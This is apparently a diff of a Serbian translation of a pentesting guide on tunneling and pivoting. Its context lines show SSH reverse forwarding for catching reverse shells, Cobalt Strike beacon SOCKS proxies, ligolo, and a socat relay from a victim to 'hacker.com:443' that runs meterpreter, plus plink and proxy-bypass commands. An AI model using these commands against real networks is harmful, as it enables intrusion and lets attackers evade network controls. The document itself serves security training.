@@ -55,9 +55,9 @@ Lokalni port --> Kompromitovani host (SSH) --> Gde god
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### Reverse Port Forwarding
+### Обратно прослеђивање порта
 
-Ovo je korisno za dobijanje obrnute ljuske sa internih hostova kroz DMZ do vašeg hosta:
+Ово је корисно за добијање обрнутог шелла са интерних хостова преко DMZ-а до вашег хоста:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -134,7 +134,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Otvorite port na teamserveru koji sluša na svim interfejsima koji se mogu koristiti za **usmeravanje saobraćaja kroz beacon**.
+Otvorite port na teamserver-u koji sluša na svim interfejsima koji se mogu koristiti za **usmeravanje saobraćaja kroz beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -145,7 +145,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> U ovom slučaju, **port je otvoren na beacon hostu**, a ne na Team Serveru, a saobraćaj se šalje na Team Server, a odatle na navedeni host:port
+> U ovom slučaju, **port je otvoren na beacon hostu**, a ne na Team Serveru, a saobraćaj se šalje na Team Server i odatle na navedeni host:port
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
@@ -219,7 +219,7 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 # Display the tun interfaces -- Attacker
 interface_list
 ```
-### Povezivanje agenta i slušanje
+### Veza i Slušanje
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
@@ -286,7 +286,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Možete zaobići **neautentifikovani proxy** izvršavajući ovu liniju umesto poslednje u konzoli žrtve:
+Možete zaobići **non-authenticated proxy** izvršavajući ovu liniju umesto poslednje u konzoli žrtve:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -322,7 +322,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 To je kao konzolna verzija PuTTY (opcije su vrlo slične ssh klijentu).
 
-Pošto će ova binarna datoteka biti izvršena na žrtvi i to je ssh klijent, potrebno je da otvorimo naš ssh servis i port kako bismo mogli da uspostavimo obrnutu vezu. Zatim, da bismo preusmerili samo lokalno dostupni port na port na našoj mašini:
+Pošto će ova binarna datoteka biti izvršena na žrtvi i to je ssh klijent, potrebno je da otvorimo naš ssh servis i port kako bismo mogli da imamo obrnutu vezu. Zatim, da bismo preusmerili samo lokalno dostupni port na port na našoj mašini:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -366,7 +366,7 @@ netstat -antb | findstr 1080
 ```
 Sada možete koristiti [**Proxifier**](https://www.proxifier.com/) **da proksirate saobraćaj kroz tu port.**
 
-## Proksirajte Windows GUI aplikacije
+## Proksiranje Windows GUI aplikacija
 
 Možete naterati Windows GUI aplikacije da prolaze kroz proksi koristeći [**Proxifier**](https://www.proxifier.com/).\
 U **Profile -> Proxy Servers** dodajte IP adresu i port SOCKS servera.\
@@ -375,7 +375,7 @@ U **Profile -> Proxification Rules** dodajte ime programa koji želite da proksi
 ## NTLM proksi zaobilaženje
 
 Prethodno pomenuti alat: **Rpivot**\
-**OpenVPN** takođe može da ga zaobiđe, postavljajući ove opcije u konfiguracionom fajlu:
+**OpenVPN** takođe može da ga zaobiđe, postavljanjem ovih opcija u konfiguracionom fajlu:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -383,7 +383,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Ova alatka se autentifikuje protiv proksija i vezuje lokalni port koji se prosleđuje eksternoj usluzi koju odredite. Zatim možete koristiti alat po vašem izboru preko ovog porta.\
+Ovaj alat se autentifikuje protiv proksija i vezuje lokalni port koji se prosleđuje eksternoj usluzi koju odredite. Zatim možete koristiti alat po vašem izboru preko ovog porta.\
 Na primer, prosledite port 443.
 ```
 Username Alice
@@ -480,7 +480,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **je alat za izlaganje rešenja internetu u jednoj komandnoj liniji.**\
-_&#x45;xposition URI su kao:_ **UID.ngrok.io**
+_Exposition URI su kao:_ **UID.ngrok.io**
 
 ### Instalacija
 
@@ -528,7 +528,7 @@ Direktno iz stdout-a ili u HTTP interfejsu [http://127.0.0.1:4040](http://127.0.
 Otvara 3 tunela:
 
 - 2 TCP
-- 1 HTTP sa statičkim fajlovima izloženim iz /tmp/httpbin/
+- 1 HTTP sa statičkim datotekama izloženim iz /tmp/httpbin/
 ```yaml
 tunnels:
 mytcp:
